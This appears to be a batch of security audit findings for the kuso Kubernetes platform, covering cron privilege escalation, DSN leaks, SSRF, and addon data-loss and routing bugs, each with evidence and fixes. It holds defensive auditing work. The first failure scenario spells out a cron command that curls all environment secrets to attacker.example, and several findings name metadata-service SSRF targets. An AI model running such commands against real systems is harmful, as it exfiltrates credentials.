title: Editor can create/update a service cron that runs arbitrary commands with the service's full secret env, bypassing the admin-only secrets/shell/run boundary
summary: CronsHandler.Add and CronsHandler.Update gate only on ProjectRoleEditor, but a service-attached command cron inherits the parent service's image + envFromSecrets and runs a caller-supplied command on a schedule, letting an editor read every secret value that env/shell/run access is deliberately restricted to admins.
failure_scenario: A user with only project-editor on project P (no secrets:read/shell/sql) sends POST /api/projects/P/services/S/crons with body {"schedule":"* * * * *","command":["sh","-c","curl -X POST https://attacker.example -d \"$(env)\""]}. crons.Service.Add calls resolveFromProductionEnv (crons.go:257) which copies the production env's Image and EnvFromSecrets (the <addon>-conn and <project>-shared secrets containing DATABASE_URL, passwords, JWT/payment keys) onto the KusoCron CR (crons.go:287). On the next tick the CronJob runs the attacker's command with all those secret VALUES mounted in its environment, exfiltrating them. This is the exact capability runs.Create was elevated to admin-only for (runs.go:88 `callerCanReadSecrets`) and that TerminalWSHandler requires PermShellExec / admin for (terminal_ws.go:103). The cron path is the unguarded equivalent. CronsHandler.Update (crons.go:196) has the same gap — an editor can repoint an existing cron's command.
fix_sketch: Gate service-attached cron Add/Update on the same admin-only check the run/shell/secret-read surfaces use: after requireProjectAccess(...Editor), also require callerCanReadSecrets(ctx, h.DB, project) (or a dedicated PermShellExec check) before allowing a kind=command cron, since it executes arbitrary code with the service's secret-bearing env. Project-scoped kind=command crons (AddProject) run a caller-supplied image without service envFromSecrets, so they are lower risk, but any code path that resolves envFromSecrets from a service env must sit behind the admin boundary.
evidence: crons.go:177 `if !requireProjectAccess(ctx, w, h.DB, chi.URLParam(r, "project"), db.ProjectRoleEditor)` for Add (and :196 for Update); crons/crons.go:257 `image, envFromSecrets, placement, err := s.resolveFromProductionEnv(...)` then :287 `EnvFromSecrets: envFromSecrets`. Compare runs.go:88 which requires callerCanReadSecrets for the identical arbitrary-command-with-service-env capability.
verify_reason: The exploit chain is verified end to end. (1) crons.go:177 (Add) and :196 (Update) gate only on requireProjectAccess(..., db.ProjectRoleEditor) — no secrets/shell/admin check; the routes mount in router.go:427 under only JWT + CSRF middleware, so per-handler authz is the sole gate. (2) Editor is a real, grantable, non-admin role that lacks PermSecretsRead/PermShellExec/PermSQLRead: permissions.go:108-114 grants editor PermProjectWrite (enough to create crons) but omits the three secret perms, and permissions_test.go:76-78 explicitly asserts "editor CANNOT read env values / open a shell / use the DB console." (3) crons.Add calls resolveFromProductionEnv (crons.go:257,421-431) which copies env.Spec.Image + env.Spec.EnvFromSecrets onto the KusoCron spec at crons.go:286-287; EnvFromSecrets holds the <addon>-conn and shared-secret names (snapshotter.go:11-15). (4) The helm chart kusocron/templates/cronjob.yaml:105-119 renders the user-supplied command as the container command AND mounts every envFromSecrets entry via envFrom.secretRef — injecting the actual secret VALUES (DATABASE_URL, passwords, JWT/payment keys) into the pod env where the attacker command runs on schedule. (5) This is the exact capability admin-gated elsewhere: runs.go:88 requires callerCanReadSecrets with comment 80-84 stating a run "executes an ARBITRARY command inside the prod pod with the service's full env ... so it's ADMIN-ONLY," and terminal_ws.go:103 requires PermShellExec for the same reason. Update (crons.go:394-396) likewise lets an editor repoint an existing cron's command. The claimed request body passes validateSchedule ("* * * * *") and the non-empty-command check; the production env exists for any deployed service. The cron path is the unguarded equivalent of the deliberately admin-only runs/shell/sql boundary. Corrected to P1 rather than P0: it requires authenticated editor membership (a semi-trusted insider with existing project write access), not an unauthenticated or external RCE path — it is privilege-escalation-to-full-secret-disclosure, a serious authz/confidentiality break with a trivial trigger.

title: Admin superuser DSN can leak to a project editor via url.Parse error
summary: provisionInstanceAddonDB wraps net/url.Parse(adminDSN) errors with %w, and Go's url.Parse embeds the full DSN (superuser password included) in its error string, which propagates verbatim into an Editor-reachable 400 response body.
failure_scenario: An instance admin registers an instance-shared Postgres admin DSN (INSTANCE_ADDON_PG_DSN_ADMIN) whose form is accepted by lib/pq during provisioning but trips net/url.Parse (e.g. a password containing a raw control char or a bad percent-escape). A project *editor* (Add is gated only at db.ProjectRoleEditor in addons.go:344) creates an addon with useInstanceAddon:"pg". Add() calls provisionInstanceAddonDB, which reaches line 149 url.Parse(adminDSN); it returns fmt.Errorf("parse admin DSN: %w", err). Add wraps it as fmt.Errorf("%w: provision instance addon db: %w", ErrInvalid, err) (addons.go:351). AddonsHandler.fail maps ErrInvalid to http.Error(w, err.Error(), 400) (addons.go:471-472). The 400 body — and any reverse-proxy access log capturing it — now contains the instance superuser DSN with password, disclosed to a non-admin editor.
evidence: line 149-151: u, err := url.Parse(adminDSN); if err != nil { return "", "", fmt.Errorf("parse admin DSN: %w", err) }  — err.Error() for *url.Error is `parse "<full-url>": <reason>`, which includes the credentials. instance_addons.go:116-121 documents this exact hazard and guards against it with a static message; this site does not.
fix_sketch: Do not include the url.Parse error in the returned message. Return a static error, e.g. return "","",fmt.Errorf("parse admin DSN: malformed"), mirroring the guard in instance_addons.go RegisterInstanceAddon.
verify_reason: Full failure path traced and reproduced. (1) net/url.Parse embeds the entire raw input in its error string: I ran a Go repro — url.Parse("host=10.0.0.5 user=postgres password=Sup3r%Secret! dbname=postgres sslmode=disable") returns `parse "host=10.0.0.5 user=postgres password=Sup3r%Secret! ...": invalid URL escape "%Se"`, i.e. the superuser password is in the message. (2) A keyword/value DSN with a '%' in the password is fully valid to lib/pq (it opens and runs the CREATE/GRANT queries at instance_provisioner.go:89-145) yet trips url.Parse at line 149, so line 151 (`fmt.Errorf("parse admin DSN: %w", err)`) is genuinely reachable after DB work succeeds. (3) Propagation: Add() wraps at addons.go:351 `fmt.Errorf("%w: provision instance addon db: %w", ErrInvalid, err)`; AddonsHandler.fail maps ErrInvalid to `http.Error(w, err.Error(), 400)` (addons.go:471-472), emitting the full DSN in the response body. (4) Privilege drop is real: registering the admin DSN requires requireAdmin (instance_secrets.go:112), but Add is gated only at db.ProjectRoleEditor (addons.go:344), and ResyncInstanceAddon is also editor-gated (handler line 204) and hits the same provisionInstanceAddonDB call — a second reachable path. (5) The maintainers already recognize this exact hazard: the sibling RegisterInstanceAddon at instancesecrets/instance_addons.go:115-121 deliberately does NOT wrap the url.Parse error and uses a static "dsn is not a valid URL" message with a comment explaining the leak; instance_provisioner.go:151 is the inconsistent, unguarded twin. Severity corrected from any P0/P1 framing to P2: it is not a direct authz bypass or unconditional leak — it requires an admin to have registered a DSN whose password contains a raw '%'/control char (uncommon), and the disclosure is to a project editor who is a semi-trusted insider, not an anonymous attacker. Real, credential-disclosing, but narrowly triggered.

title: External PG admin DSN echoed in 400 body via url.Parse error
summary: coerceSSLMode wraps net/url.Parse(dsn) errors with the raw error string, which contains the full admin DSN (password included); this propagates through ConfigureExternal's ErrInvalid path into the 400 response body and any intermediary logs.
failure_scenario: An admin submits an external PG admin DSN via POST /api/instance-pg/external whose password contains a character that fails net/url.Parse (e.g. postgres://u:p%zz@host/db, an invalid percent-escape). The postgres:// prefix check passes (instancepg.go:345), then coerceSSLMode calls url.Parse which errors; line 386 returns fmt.Errorf("dsn parse: %s", err). ConfigureExternal returns fmt.Errorf("%w: %s", ErrInvalid, cerr) (instancepg.go:350). InstancePGHandler.fail maps ErrInvalid to http.Error(w, err.Error(), 400) (instancepg.go:115-116). The response body contains the raw DSN including the plaintext password, which is then also captured by any reverse-proxy/response-logging layer and browser devtools/history. Same self-leak class the codebase already guards in instance_addons.go.
evidence: line 386: return "", fmt.Errorf("dsn parse: %s", err) — *url.Error.Error() = `parse "<full-dsn>": <reason>`, embedding the credentials; propagated verbatim to the client via the ErrInvalid handler path.
fix_sketch: Return a static message that omits the parsed URL, e.g. return "", fmt.Errorf("dsn is not a valid URL"), matching instance_addons.go:116-121.
verify_reason: Exact path traced and empirically verified: instancepg.go:386 wraps url.Parse's *url.Error, whose Error() embeds the full raw DSN unredacted (verified via go run: `parse "postgres://admin:sup3rSecret%zz@db.example.com:5432/postgres": invalid URL escape "%zz"`); line 350 wraps it in ErrInvalid, and handlers/instancepg.go:115-116 sends err.Error() verbatim as the 400 body for POST /api/instance-pg/external. However severity is overrated: the endpoint is admin-only (requireAdmin), the leaked DSN is echoed only to the same caller who just submitted it in the request body, kuso's access log (router.go slogRequest) logs no bodies and the ErrInvalid branch never logs the error, and any body-logging proxy would already have the DSN from the request. Also the reviewer's cited precedent guard in instance_addons.go doesn't exist (no such file). Real hygiene bug — redact userinfo before wrapping — but minor: P3.

title: Cron onFailure webhook is a server-side SSRF (no URL validation, plain transport)
summary: A project editor can set a cron's onFailure.webhookURL to an internal/metadata address; kuso-server POSTs to it on cron failure using a default (non-SSRF-safe) HTTP client, and the URL is never validated when stored.
failure_scenario: A user with ProjectRoleEditor calls PATCH /api/projects/{p}/crons/{name} (handler crons.go:76 gates only ProjectRoleEditor) with body {"onFailure":{"webhookURL":"http://169.254.169.254/latest/meta-data/"}}. crons.go:524-528 stamps WebhookURL onto the CR with NO validation (contrast the notify path, which calls validateWebhookURL). The user controls the cron command, so they force a non-zero exit. On the next cronwatch tick, dispatchWebhook builds http.NewRequestWithContext(ctx, POST, cron.Spec.OnFailure.WebhookURL, ...) (cronwatch.go:329) and sends it via w.httpClient() = &http.Client{Timeout:...} (cronwatch.go:117) — the default transport, NOT httpx.SSRFSafeTransport(). kuso-server (a pod with the control-plane service account) thus issues an attacker-directed request to 169.254.169.254 (cloud IMDS), http://10.96.0.1 (kube apiserver), or any http://<svc>.<ns>.svc internal endpoint. It is a blind SSRF (fire-and-forget POST) but reaches cluster metadata / internal services from a privileged network position — exactly what SSRFSafeTransport exists to prevent (see httpx/ssrf.go:10-16).
fix_sketch: Call validateWebhookURL(req.OnFailure.WebhookURL) in crons.go before storing (as notifications.go:PutSettings does), AND set w.HTTP = &http.Client{Timeout: ..., Transport: httpx.SSRFSafeTransport()} in cronwatch (cronwatch.go:116 and httpClient() at :273). The dispatcher path already proves the pattern (notify.go:277).
verify_reason: Every link in the chain verified in code. (1) Storage with no validation: server-go/internal/crons/crons.go:521-530 stamps req.OnFailure.WebhookURL directly onto cr.Spec.OnFailure with zero URL validation — in direct contrast to the notify path (handlers/notifications.go:480 validateWebhookURL) and backups path (backups.go:162), which both reject reserved IPs, localhost, and *.svc/*.cluster.local hosts. (2) Low-privilege trigger: the update handler at handlers/crons.go:76 gates only db.ProjectRoleEditor (not admin/owner). The same request controls the cron's Image/Command (crons.go:88-90, 116-117), so the attacker can force a non-zero exit at will. (3) Unsafe dispatch: cronwatch.dispatchWebhook (cronwatch.go:290) builds http.NewRequestWithContext(ctx, POST, cron.Spec.OnFailure.WebhookURL, ...) at line 329 and sends via w.httpClient().Do (line 338). httpClient() (line 269-273) returns a bare &http.Client{Timeout:...} with a nil Transport → Go's http.DefaultTransport, which honors HTTP(S)_PROXY and has no reserved-IP dial guard. The Run()-initialized client (line 116-117) is identically bare. Neither uses httpx.SSRFSafeTransport(), which the package doc (httpx/ssrf.go:10-16) explicitly says exists to block exactly 169.254.169.254 (IMDS) and 10.96.0.1 (kube apiserver). Production wiring confirms w.HTTP is never set (cmd/kuso-server/main.go:1079-1084 constructs the Watcher without an HTTP field), so the unsafe default is what runs. The kuso-server pod holds the control-plane service account and sits inside the cluster network, so the request reaches IMDS/apiserver/internal *.svc endpoints. Correctly rated P1, not P0: it is a blind fire-and-forget POST — dispatchWebhook returns only success/error, never the response body to the attacker (line 346 discards the body), so no confidentiality read-out or authz bypass is demonstrated end-to-end, and modern IMDSv2 requires a token PUT that a blind POST can't perform. Real security bug with a concrete low-privilege trigger and privileged network reach, so above P2.

title: Backup S3 endpoint SSRF: validation skips DNS resolution and the AWS client uses the default transport
summary: The admin-set S3 endpoint is validated only with validateWebhookURL (which deliberately does not resolve DNS and only rejects private IP *literals*), then used to build an AWS S3 client on the default HTTP transport, so a hostname resolving to a private/metadata IP reaches internal targets — contradicting the stated threat model that admins must not be able to pivot via SSRF.
failure_scenario: An admin PUTs /api/admin/backup-settings with endpoint="http://my-rebind-host.example.com" where that host resolves to 169.254.169.254 or 10.96.0.1. validateWebhookURL (notifications.go:480) parses the URL and only calls net.ParseIP(host) on IP *literals* — a DNS hostname passes because it is not an IP literal and the comment explicitly says it does not resolve at validation time. s3Client (backups.go:630-643) then builds the client via awsconfig.LoadDefaultConfig with no custom HTTPClient, i.e. Go's default transport (not httpx.SSRFSafeTransport). GET /api/projects/{p}/addons/{a}/backups calls ListObjectsV2 against that endpoint from inside the cluster. ssrf.go:13-16 states admins should still not be able to reach 169.254.169.254 / RFC1918 via kuso; this path lets them, and List even surfaces the AWS error string to the client (backups.go:268), aiding response probing.
fix_sketch: Build the S3 client with an aws.HTTPClient backed by httpx.SSRFSafeTransport() (awsconfig.WithHTTPClient), matching the import_coolify path that already uses SSRFSafeTransport for the same admin-supplied-URL threat class.
verify_reason: All three load-bearing facts trace to real code. (1) validateWebhookURL (notifications.go:480-508) only calls net.ParseIP(host) and checks reserved ranges for IP *literals*; a DNS hostname returns nil from ParseIP and passes, and the comment (476-479) explicitly states DNS is not resolved at validation. The .svc/.cluster.local suffix blocklist does not catch an attacker-controlled public name that resolves to 169.254.169.254 or 10.96.0.1. (2) s3Client (backups.go:630-643) calls awsconfig.LoadDefaultConfig with only WithRegion + WithCredentialsProvider and no WithHTTPClient, so the AWS SDK uses its default transport with ordinary DNS resolution and no reserved-IP dial guard — unlike import_coolify.go:113/216 and notify.go:277 which explicitly use httpx.SSRFSafeTransport(). (3) List (backups.go:262-268) calls ListObjectsV2 against that endpoint from inside the cluster and returns the AWS error string to the client via 'list failed: '+err.Error(), aiding probing. The stated threat model (ssrf.go:13-16) says admins must NOT be able to pivot to IMDS/RFC1918, and backups.go:159-161 concedes the surface is unguarded. Downgraded from an implied P1 to P2: the trigger requires admin (requireAdmin on PutSettings), and the SSRF is semi-blind via a signed S3 ListObjectsV2 request rather than an arbitrary GET, which constrains IMDS credential exfil to mainly internal-reachability probing and error-string leakage.

title: Project-delete label sweep destroys keep-annotated addon conn secrets
summary: The unconditional project-scoped Secret sweep in DeleteWithOptions deletes every Secret labeled kuso.sislelabs.com/project=<name>, which includes all helm-chart-owned addon secrets (<addon>-conn, <addon>-app, <addon>-tls, <addon>-userconf), defeating the helm.sh/resource-policy: keep annotations whose whole purpose is to align the credential lifecycle with the retained data PVC.
evidence: projects_ops.go:465-476 lists Secrets with `LabelSelector: labelSelector(map[string]string{labelProject: name})` and deletes each; labelProject = kube.LabelProject = "kuso.sislelabs.com/project" (kube/selectors.go:20). Every kusoaddon chart Secret carries that exact label via `include "kusoaddon.labels"` (_helpers.tpl:68-75, e.g. postgres.yaml:269-270). The sweep's own comment says it targets only 'Secrets created imperatively by kuso-server (NOT by any helm chart)' — but the selector matches the chart secrets too. postgres.yaml:262-268 documents the keep annotation exists precisely so 'a delete+re-add over the surviving PVC' does not mint a fresh password; DeleteProjectOptions (projects_ops.go:333-345) documents that plain Delete 'keeps the addon PVCs around (safe default)'.
failure_scenario: User deletes project `foo` WITHOUT PurgeData (the documented safe default: data retained). Addon data PVCs survive (VCT PVCs are never GC'd), but the sweep deletes foo-pg-conn despite its keep annotation. User recreates project foo + addon pg with the same name expecting the data back (addons.go:749-753 even logs 're-adding this addon name will reuse the old data'). The chart's `lookup` finds no conn Secret, mints a fresh randAlphaNum password (postgres.yaml:32-59), postgres starts on the old data dir holding the OLD password → every app fails auth with the exact SASL-mismatch scenario the PurgeData comment describes — now triggered by the non-destructive path, with no recovery except manual password reset inside the DB.
fix_sketch: Exclude helm-owned secrets from the sweep (skip secrets with label app.kubernetes.io/managed-by: Helm or app.kubernetes.io/name: kusoaddon), or move the sweep behind opts.PurgeData; keep only the deterministic imperative names (<project>-shared, <project>-<svc>-secrets, <project>-<svc>-<env>-secrets) in the non-purge path.
verify_reason: Traced end-to-end: projects_ops.go:465-476 sweeps Secrets by kuso.sislelabs.com/project=<name> unconditionally (the PurgeData gate at :519 covers only PVCs), deleting each match with no helm-ownership exclusion. labelProject = kube.LabelProject = "kuso.sislelabs.com/project" (projects.go:239, selectors.go:20), and every kusoaddon chart Secret — including <addon>-conn and <addon>-tls — carries that exact label via the kusoaddon.labels helper (_helpers.tpl; postgres.yaml includes it on both Secrets), in the same namespace ns the sweep targets. helm.sh/resource-policy: keep only stops helm, not direct API deletes. Failure path holds: non-purge delete retains VCT PVCs but kills the conn Secret; on same-name recreate the chart drift guard (fail when STS exists but Secret missing) doesn't trip because the STS is gone too, so lookup finds nothing and randAlphaNum mints a fresh password over the old initialized pgdata → cluster-wide SASL auth failure, exactly the scenario the PurgeData comment (projects_ops.go:333-345) warns about, now on the documented safe default, contradicting addons.go:752's "re-adding this addon name will reuse the old data" promise. Severity corrected to P2 rather than P1: the claim overstates recovery ("no recovery except manual password reset") — kuso project addon repair-password (addons/repair.go:41) resyncs postgres, the dominant case; data on the PVC is never lost; and the trigger requires a specific delete+recreate-same-name sequence. Non-postgres kinds (mysql/mongodb) do need manual DB surgery (repair.go:60 restricts to postgres), keeping this solidly a real bug, just a narrow one.

title: HA postgres addon delete destroys all data (CNPG PVCs are GC'd)
summary: For ha=true postgres the chart renders a CloudNativePG Cluster (no keep annotation); CNPG-created PVCs carry ownerReferences to the Cluster, so KusoAddon delete → helm uninstall → Cluster delete → kube GC removes all three data PVCs immediately — directly contradicting the delete path's contract that 'deleting the addon does NOT delete its data'.
evidence: postgres-ha.yaml:81-98 renders `postgresql.cnpg.io/v1 Cluster` with no helm.sh/resource-policy annotation. addons.go:742-751 asserts 'the StatefulSet's volumeClaimTemplates PVCs are RETAINED … an accidental delete shouldn't nuke a production DB' — true only for the single-node StatefulSet charts, false for CNPG which owns and garbage-collects its PVCs on Cluster deletion. The advisory warning is also silent for HA: retainedPVCsForAddon (addons.go:781-783) filters `app.kubernetes.io/instance=<fqn>`, a label CNPG PVCs do not carry (they get cnpg.io/* labels), so the operator gets no orphan trail either. Compounding: the <name>-app bootstrap Secret (postgres-ha.yaml:69-79) lacks keep, unlike the conn Secret (line 141-143), so even the credentials don't survive.
failure_scenario:
Operator accidentally runs `kuso project addon delete

` (or a project delete without purge) on a production HA postgres. Unlike the non-HA path where the PVC survives and re-add recovers the data, all three CNPG replica PVCs are garbage-collected within seconds. Data is unrecoverable except from barman/manifested backups; the log meanwhile prints nothing about lost PVCs, so the loss is discovered only when the re-added addon comes up empty.
fix_sketch: Gate HA-addon deletion behind an explicit confirm/backup step in addons.Delete (detect spec.ha && kind==postgres, require a fresh backup or a force flag), and/or set CNPG's Cluster ownership so PVCs are retained (e.g. annotate the Cluster with helm.sh/resource-policy: keep and document the orphaned-Cluster cleanup). Fix retainedPVCsForAddon to also match cnpg.io/cluster=<fqn> so the trail warning fires.
verify_reason: Traced end-to-end. postgres-ha.yaml:81-129 renders the CNPG Cluster with only kusoaddon.labels — no helm.sh/resource-policy: keep — while every sibling data-bearing chart (postgres.yaml:268, mysql.yaml:128, redis.yaml:101, mongodb.yaml:113, valkey.yaml:105, rabbitmq.yaml:107, meilisearch.yaml:122) deliberately carries keep. KusoAddon delete → helm-operator uninstall-release finalizer (watches.yaml:47) deletes the Cluster; CNPG creates its per-instance PVCs with ownerReferences to the Cluster (CNPG has no PVC-retain option), so kube GC removes all three data PVCs — unlike the single-node path whose PVC is a StatefulSet volumeClaimTemplates PVC that k8s never GCs. addons.go Delete (704-769) has no cr.Spec.HA branch and its comment (742-751) asserts data is retained, which is false for HA. The advisory retainedPVCsForAddon (781-783) filters app.kubernetes.io/instance=<fqn>, a label CNPG PVCs don't get (the Cluster spec sets no inheritedMetadata; CNPG stamps cnpg.io/* labels), so the operator sees no warning and no orphan trail — silent loss, as claimed. The <name>-app bootstrap Secret (postgres-ha.yaml:69-79) also lacks keep while the conn Secret (141-143) has it, confirming the compounding detail. Severity corrected to P1: irreversible production data loss with a real, documented-as-safe trigger, but it requires an operator with delete rights — not an authz bypass or externally exploitable P0.

title: Env-group clone copies production custom domains → traffic hijack + LE churn
summary: CreateEnvGroup stamps the cloned env with `AdditionalHosts: domainHosts(item.svc.Spec.Domains)` and includes them in TLSHosts, so a staging/qa clone claims the service's production custom domains — the exact bug the single-env custom path explicitly nils out and documents as a routing-hijack plus Let's Encrypt rate-limit hazard.
evidence: env_groups.go:594-595 sets `AdditionalHosts: domainHosts(item.svc.Spec.Domains)` and `TLSHosts: computeTLSHosts(host, domainHosts(item.svc.Spec.Domains))` with TLSEnabled=true / letsencrypt-prod (lines 599-600). The sibling path services_ops.go:970-988 sets `AdditionalHosts: nil` with a comment spelling out both harms: 'a request to tickero.bg could land on the staging Deployment… routing becomes non-deterministic' and 'cert-manager issues an extra-cert for each shared host on each env; staging then races production for the same Let's Encrypt cert, hitting rate limits'.
failure_scenario: Service has custom domain shop.example.com on production. User creates env group "staging". The staging env's Ingress also claims shop.example.com: traefik now has two routers for the host, and live customer requests non-deterministically land on the staging Deployment (stale code, staging DB). Simultaneously cert-manager mints <staging-env>-tls-extra-shop.example.com, racing production's cert for the same FQDN against the LE duplicate-certificate limit (5/week) — repeated group create/delete cycles exhaust it and block re-issuance for the production host too.
fix_sketch: Mirror services_ops.go: set AdditionalHosts to nil and TLSHosts to computeTLSHosts(host, nil) in the env-group clone literal at env_groups.go:594-595.
verify_reason: Exact failure path traced. server-go/internal/projects/env_groups.go:594-595 stamps the cloned env with AdditionalHosts/TLSHosts derived from the SOURCE service's Spec.Domains (item.svc = &services[i], the production service), with TLSEnabled=true and ClusterIssuer=letsencrypt-prod (lines 599-600). cloneServiceSpec (lines 855-864) copies Spec.Domains onto the cloned KusoService too, so propagation re-asserts the shared hosts. The kusoenvironment chart (templates/ingress.yaml lines 11, 123, 137) renders every additionalHosts entry as an Ingress rule plus a cert-manager-issued <fqn>-tls-extra-<host> secret, so the clone's Ingress genuinely claims production's custom FQDN on the same traefik ingress class — two routers for one host, non-deterministic routing. The sibling single-env path services_ops.go:970-988 explicitly sets AdditionalHosts nil with a comment documenting exactly these two harms (host collision + LE cert race), proving the group path missed a known-required guard. Reachable via POST /api/projects/{project}/env-groups and the CLI. Minor imprecision: the LE 5/week duplicate-certificate limit applies to identical SAN sets, which the staging extra-cert (single-host) and production cert usually aren't; the real pressure is the 50/week per-registered-domain and failed-validation limits — directionally right, detail wrong. Severity P1 not P0: serious correctness/data-integrity bug triggered by a normal operation (production traffic served by stale staging code against staging DB), but not attacker-exploitable authz bypass/RCE on this single-tenant platform.

title: Addon size change rewrites immutable VCT storage and wedges the helm release
summary: Update guards ha/storageSize/database as immutable but applies req.Size unguarded; when spec.storageSize is empty (the default), the chart derives the volumeClaimTemplates storage request from size, so a size-tier change (small→medium) mutates the immutable VCT and every subsequent helm upgrade of that addon fails — the same failure class as the v0.18 VCT-annotation incident.
evidence: addons.go:522-524 sets `addon.Spec.Size = *req.Size` with no immutability check, while lines 534-547 refuse ha/storageSize/database changes citing EDIT_SAFETY.md; EDIT_SAFETY.md:58 lists `size` itself as '❌ No — StatefulSet PVC templates are immutable'. _helpers.tpl:142-154 maps size→storage (small 5Gi, medium 20Gi, large 100Gi) when .Values.storageSize is unset, and every engine's VCT renders it (postgres.yaml:196, mysql.yaml:102, redis-ha.yaml:242, mongodb.yaml:86, etc.). K8s rejects any change to StatefulSet volumeClaimTemplates, so the operator's `helm upgrade` fails on every reconcile thereafter. The field is exposed end-to-end: handlers/addons.go:57 passes wire Size through, and the UpdateAddonRequest doc-comment (addons.go:449-450) advertises 'size change' as a UI Settings-tab operation.
failure_scenario: User PATCHes addon size small→medium (UI Settings tab or `kuso addon update`) on a postgres created without explicit storageSize. Operator renders VCT storage 5Gi→20Gi, the StatefulSet update is rejected as an immutable-field change, helm upgrade fails, and the release is wedged: every later spec change — backup schedule, tls flip, pooler toggle, publicTCP route — silently never lands until someone reverts size to the original value. The API returns 200, so nothing tells the user the addon is now unmanageable.
fix_sketch: In Update, refuse a size change whenever it would alter the effective storage (spec.storageSize empty and the tier's derived storage differs), same ErrConflict pattern as the storageSize guard; alternatively pin spec.storageSize to the derived value at Add time so later size changes only affect resources.
verify_reason: Fully traced. addons.go:522-524 applies req.Size with no immutability guard, while ha/storageSize/database directly below (lines 534-547) are refused with ErrConflict — and the HA guard's comment itself quotes EDIT_SAFETY.md as saying "size/ha/storageSize/database are all ❌ No", so the omission is plainly a missed guard, not a design choice. Add() (addons.go:309) never defaults StorageSize and values.yaml defaults it to "", so the empty-storageSize path is the norm. _helpers.tpl:142-154 (kusoaddon.storageSize) derives VCT storage from size (small 5Gi / medium 20Gi / large 100Gi) when .Values.storageSize is empty, and that helper renders inside volumeClaimTemplates in every engine template (postgres.yaml:196, mysql.yaml:102, redis-ha.yaml:242, mongodb.yaml:86, redpanda.yaml:135, nats.yaml:153, clickhouse.yaml:156, and more). Kubernetes rejects StatefulSet volumeClaimTemplates changes, so helm upgrade fails on every reconcile while the CR carries the new size — subsequent spec changes (backup, tls, pooler, publicTCP) never land, matching the documented v0.18 VCT-annotation incident class. Exposure is end-to-end: handlers/addons.go apiv1UpdateAddonToDomain passes Size through the PATCH route (mounted with comment "Edit version / size / ..."), and the UpdateAddonRequest doc-comment advertises size change as a UI Settings-tab operation; the API returns 200 and records a revision, so the wedge is silent. Severity stays P1: real trigger and serious correctness failure (addon becomes unmanageable silently), but no data loss — the old StatefulSet keeps serving on the old PVC and reverting size unwedges it — so not P0.

title: Conn Secret missing resource-policy=keep in 7 addon templates
summary: The v0.18.109 fix aligning the conn Secret lifecycle with the retained data PVC (helm.sh/resource-policy: keep) was applied to postgres/postgres-ha/mysql/mongodb/redis/valkey/rabbitmq/meilisearch but not to s3 (s3.yaml:123), clickhouse (clickhouse.yaml:177 conn + :34 userconf), nats (nats.yaml:174), nats-ha (nats-ha.yaml:217), redpanda (redpanda.yaml:162), redis-ha (redis-ha.yaml:329), or mailpit (mailpit.yaml:107) — so delete+re-add over a surviving data PVC mints fresh credentials on those kinds.
evidence: grep shows keep annotations only in meilisearch:122, mailpit:81 (PVC only, not the Secret), mysql:128, mongodb:113, postgres-ha:143, postgres:246/268, rabbitmq:107, redis:101, valkey:105. All charts reuse credentials via `lookup` on the conn Secret (e.g. s3.yaml:19-29), so once helm uninstall deletes it the credential is gone while the VCT data PVC survives. Materially worst for s3: MinIO (pinned RELEASE.2024-08-17, s3.yaml:2) persists its IAM/config backend in the data volume keyed to the root credentials rendered from this Secret.
failure_scenario: User deletes and re-adds an s3 addon with the same name (the recovery flow the delete-path log at addons.go:749-753 explicitly advertises). The data PVC survives, but the conn Secret was uninstalled, so the chart lookup finds nothing and mints fresh S3_ACCESS_KEY_ID/S3_SECRET_ACCESS_KEY. MinIO boots with new root credentials over a data dir whose IAM/config state was written under the old ones — service accounts/policies break (or startup fails on the encrypted config backend), and every app's stored pre-signed flow is invalidated, despite the platform's promise that same-name re-add reuses the old state.
fix_sketch: Add `helm.sh/resource-policy: keep` to the conn Secret metadata in s3.yaml, clickhouse.yaml (conn + userconf), nats.yaml, nats-ha.yaml, redpanda.yaml, redis-ha.yaml, mailpit.yaml — mirroring postgres.yaml:262-268.
verify_reason: Core defect confirmed with exact code. Grep shows helm.sh/resource-policy: keep on conn Secrets only in postgres(:246,268)/postgres-ha(:143)/mysql(:128)/mongodb(:113)/redis(:101)/valkey(:105)/rabbitmq(:107)/meilisearch(:122); it is absent from s3.yaml:123, clickhouse.yaml:34+177, nats.yaml:174, nats-ha.yaml:217, redis-ha.yaml:329, redpanda.yaml:162, mailpit.yaml:107. s3.yaml:19-29 does lookup-or-mint: `lookup "v1" "Secret" ... $secretName` then `$accessKey := $existingAK | default (randAlphaNum 20)` / `$secretKey := ... | default (randAlphaNum 40)`; same pattern in clickhouse:20-25, nats:22-27, nats-ha:30-35, redis-ha:38-43. server-go/internal/addons/addons.go delete path (~744) confirms VCT PVCs survive inherently and logs "re-adding this addon name will reuse the old data" — so on delete+re-add the PVC survives but the uninstalled Secret forces fresh credentials, exactly the bug class fixed in v0.18.109 for the other kinds. Two corrections narrow scope: (1) redpanda and mailpit conn Secrets contain NO generated credentials (only deterministic host/port/URL values; mailpit MAIL_PASSWORD is a static empty string) — they re-render identically, so only 5 of the claimed 7 kinds are affected; (2) for nats/nats-ha/clickhouse/redis-ha the credential lives in chart-rendered runtime config, not in on-disk data, so a re-add converges self-consistently (new server password = new secret = what re-subscribed apps read) — impact is limited to external/out-of-band credential holders. Only s3/MinIO has credential-derived state (.minio.sys IAM/config) persisted on the surviving PVC, making it the one kind with a real boot-over-stale-state hazard. Severity P2, not P1: real and triggerable via the advertised same-name re-add flow, but the materially damaging path is a single addon kind, object data itself is not lost, and the previously-fixed DB kinds (where auth-vs-disk mismatch causes hard outage) are unaffected.

title: Addon version change accepted despite documented immutability
summary: Update applies req.Version straight into spec.Version with no guard, although EDIT_SAFETY.md:57 declares version '❌ No — treat as new addon'; a major-version bump lands as a pod-template image change and crash-loops the datastore on its incompatible data directory.
evidence: addons.go:519-521 (`if req.Version != nil { addon.Spec.Version = *req.Version }`) inside the same closure that refuses ha (534-536), storageSize (542-544), and database (545-547) with ErrConflict. The version field is exposed on the wire (handlers/addons.go:56) and the UpdateAddonRequest comment (addons.go:449-450) advertises 'version bump' as a UI Settings-tab operation. Charts consume it directly as the image tag (e.g. postgres.yaml uses .Values.version; postgres-ha.yaml:88 `imageName: ghcr.io/cloudnative-pg/postgresql:{{ $version }}`).
failure_scenario: User PATCHes a postgres addon from version 16 to 17 expecting an in-place upgrade. The StatefulSet pod template updates (valid k8s change, helm upgrade succeeds), the pod restarts with the 17 image against a 16-initialized PVC and crash-loops on 'database files are incompatible with server' — production DB down, all subscribed services erroring, until the user figures out they must PATCH the version back. Downgrades fail the same way.
